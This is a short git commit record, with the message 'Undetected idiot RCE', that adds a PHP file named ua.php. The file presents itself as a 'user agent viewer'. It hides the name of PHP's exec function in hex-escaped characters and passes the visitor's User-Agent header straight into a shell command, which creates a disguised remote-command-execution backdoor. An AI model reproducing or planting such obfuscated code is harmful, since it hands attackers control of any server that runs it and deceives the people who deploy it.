6649eb6e87fbe4fa02b75e9741e86f5b240ba72f
Cvar1984 <32727560+Cvar1984@users.noreply.github.com>
2019-11-08 17:23:29 +0700

    Undetected idiot RCE

---
+++ ua.php
@@ -0,0 +1,8 @@
+<?php
+// user agent viewer
+$array=array("\x65","\x78","\x65","\x63");
+implode('',$array)('echo My user agent is : '.$_SERVER['HTTP_USER_AGENT'].' 2>&1',$res);
+$len=count($res);
+for($x=0;$x<$len;$x++) {
+    echo $res[$x]."<br>\n";
+}
